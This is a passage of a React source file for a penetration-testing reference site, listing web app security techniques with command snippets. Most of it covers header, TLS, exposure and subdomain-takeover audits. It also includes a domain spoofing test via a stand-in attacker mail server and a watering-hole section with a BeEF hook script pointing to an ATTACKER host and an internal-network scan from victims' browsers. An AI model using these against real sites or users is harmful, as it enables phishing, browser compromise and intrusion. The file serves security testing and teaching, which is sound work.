# Redirect: allowlist validation

# CodeQL — deep taint analysis (GitHub Actions or CLI)
codeql database create db --language=python --source-root=.
codeql query run --database=db path/to/query.ql
# Use built-in security queries:
codeql database analyze db codeql/python-queries --format=sarif --output=results.sarif`
      }
    ]
  },
  {
    id: 'appsec',
    title: 'AppSec — Security Headers & Configuration',
    subtitle: 'Security headers audit, TLS configuration, CORS policy, CSP hardening, secrets in responses',
    tags: ['security headers', 'TLS', 'HSTS', 'CSP', 'CORS', 'HPKP', 'certificate', 'misconfiguration'],
    steps: [
      'Audit HTTP security headers: CSP, HSTS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy',
      'Check TLS configuration: supported versions, cipher suites, certificate validity and pinning',
      'Scan for information disclosure: server version headers, stack traces, verbose errors, debug info',
      'Check for sensitive data in API responses: password fields, internal IPs, PII, tokens',
      'Audit CORS policy — overly permissive origins, credentials with wildcards',
      'Check for subdomain takeover: dangling DNS records pointing to deprovisioned cloud resources',
      'Test email security: SPF, DKIM, DMARC policies — can you spoof the domain?',
    ],
    commands: [
      {
        title: 'Security header audit',
        code: `# Check all security headers at once
curl -sI https://target.com | grep -i "strict-transport\|content-security\|x-frame\|x-content-type\|referrer\|permissions-policy\|cache-control\|x-powered-by\|server:"

# nikto — web server misconfiguration scan
nikto -h https://target.com -o nikto_results.txt

# testssl.sh — comprehensive TLS audit
./testssl.sh --full target.com
./testssl.sh --severity HIGH target.com

# Nuclei — header/misconfiguration templates
nuclei -u https://target.com -t technologies/ -t misconfiguration/ -t exposures/
nuclei -u https://target.com -t http/misconfiguration/security-headers.yaml
nuclei -u https://target.com -t http/exposures/   # Sensitive file exposure

# Check for information disclosure
curl -sI https://target.com | grep -i "x-powered-by\|server:\|x-aspnet\|x-generator"
# Disable in Apache: ServerTokens Prod
# Disable in Nginx: server_tokens off;
# Disable in IIS: remove via web.config customHeaders

# Check for verbose error messages
curl "https://target.com/api/user?id=abc" -v 2>&1 | grep -i "exception\|stack\|error\|trace\|sql"

# Subdomain takeover check
# Find dangling CNAMEs
subfinder -d target.com -o subdomains.txt
cat subdomains.txt | while read sub; do
  cname=$(dig +short CNAME $sub)
  [ -n "$cname" ] && echo "$sub → $cname"
done
# Check if CNAME target is still registered:
subjack -w subdomains.txt -t 100 -timeout 30 -ssl -c ~/go/src/github.com/haccer/subjack/fingerprints.json

# SPF/DKIM/DMARC check
dig TXT target.com | grep -i "spf\|v=spf"
dig TXT _dmarc.target.com
# Spoof test — if DMARC policy=none or missing
swaks --to target@test.com --from ceo@target.com --header "Subject: Test" \\
  --server mail.attacker.com`
      },
      {
        title: 'Sensitive data exposure & response auditing',
        code: `# Spider and grep responses for sensitive data
# Burp Suite: turn on logging, spider target, search responses
# Manually grep crawled responses:
grep -rn "password\|secret\|token\|api_key\|private_key\|ssn\|credit_card" ./burp_logs/

# Check all API responses for over-sharing
# Account endpoints often return internal IDs, hashed passwords, role flags
curl -H "Authorization: Bearer USER_TOKEN" https://target.com/api/me | jq

# Check for PII in logs / error messages
curl "https://target.com/api/user/INVALID_ID" 2>&1

# Check JS bundle for hardcoded config
curl -s https://target.com/app.js | grep -Eo '(apiKey|secret|token|password|AUTH)['"'"'"][^'"'"'"]+['"'"'"]'

# Check HTTP response for debug data
curl -s https://target.com/api/v1/users \\
  -H "X-Debug: true" \\
  -H "X-Internal: true" \\
  -H "X-Original-URL: /admin/users"

# robots.txt / sitemap.xml — find hidden paths
curl https://target.com/robots.txt
curl https://target.com/sitemap.xml
# Also try:
/.git/config, /.env, /backup.zip, /db.sql, /.DS_Store, /WEB-INF/web.xml
/actuator, /actuator/env, /actuator/health   # Spring Boot actuator`
      }
    ]
  },
  {
    id: 'driveby',
    title: 'Drive-by / Watering Hole',
    subtitle: 'Compromise users via malicious websites, browser exploits, and SEO poisoning',
    tags: ['browser exploit', 'SEO poison', 'malvertising', 'BeEF', 'browser fingerprinting'],
    steps: [
      'Identify websites frequently visited by target employees (industry forums, portals)',
      'Compromise the site or inject content via XSS/ad network to deliver browser exploits',
      'Use BeEF (Browser Exploitation Framework) to hook browsers and pivot to internal network',
      'SEO poisoning: create high-ranking pages for searches target employees perform',
      'Deliver signed/legitimate-looking executables via download prompts',
    ],
    commands: [
      {
        title: 'BeEF browser hooking',
        code: `# Start BeEF
cd /usr/share/beef-xss && ./beef

# Inject hook into watering hole page (XSS or compromised site)
<script src="http://ATTACKER:3000/hook.js"></script>

# BeEF commands via UI or API
# Network discovery — scan internal network from victim's browser
curl http://ATTACKER:3000/api/modules/run \\
  -H "Content-Type: application/json" \\
  -d '{"token":"API_TOKEN","session":"HOOKED_SESSION","module":"Network Discovery","options":{"ipRange":"192.168.0.1-254"}}'

# Redirect victim to credential phishing page
# Fingerprint browser and OS for targeted exploit
# Deliver payload via browser notification or download prompt`
      }
    ]
  },
];

export default function ExternalApplications() {
  return (
    <div>
      <h2 className="font-mono text-lg font-bold text-emerald-400 mb-2">External Applications</h2>
      <p className="text-slate-500 text-sm mb-6">
        Web Application Hacking — Authentication, Authorization, Injection, HTTP Attacks, Source Code Review, AppSec
      </p>
      <div className="grid grid-cols-1 gap-4">
        {techniques.map((t) => (
          <div key={t.id} id={t.id}>
            <TechniqueCard
              title={t.title}
              subtitle={t.subtitle}
              tags={t.tags}
              accentColor="green"
              steps={t.steps}
              commands={t.commands}
            />
          </div>
        ))}
      </div>
    </div>
  );
}